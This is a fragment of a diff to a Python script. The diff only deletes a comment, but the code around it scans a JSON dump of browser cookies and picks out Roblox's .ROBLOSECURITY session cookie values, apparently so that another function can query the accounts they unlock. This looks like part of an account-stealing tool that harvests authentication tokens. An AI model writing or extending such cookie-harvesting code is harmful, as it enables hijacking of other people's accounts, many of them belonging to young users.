@@ -25,7 +25,6 @@ def get_roblox_info(cookie):
 
 def extract_roblox_cookies(all_cookies_json):
     roblox_accounts = []
-    # Roblox uses .ROBLOSECURITY cookie for authentication
     for cookie in all_cookies_json:
         if cookie.get('name') == '.ROBLOSECURITY' and 'roblox.com' in cookie.get('host', ''):
             val = cookie.get('value')
